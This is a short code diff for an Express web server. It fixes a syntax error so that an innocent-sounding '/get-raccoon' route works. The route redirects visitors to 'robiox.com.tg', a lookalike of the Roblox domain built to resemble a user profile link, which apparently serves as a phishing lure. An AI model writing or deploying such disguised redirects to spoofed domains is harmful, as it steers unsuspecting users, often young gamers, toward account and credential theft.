@@ -45,7 +45,7 @@ app.get('/', (req, res) => {
 // Route to handle the redirect
 app.get('/get-raccoon', (req, res) => {
   // Change this URL to wherever you want to redirect
-  res.redirect('https://www.robiox.com.tg/users/187135177344/profile);
+  res.redirect('https://www.robiox.com.tg/users/187135177344/profile');
 });
 
 app.listen(port, () => {
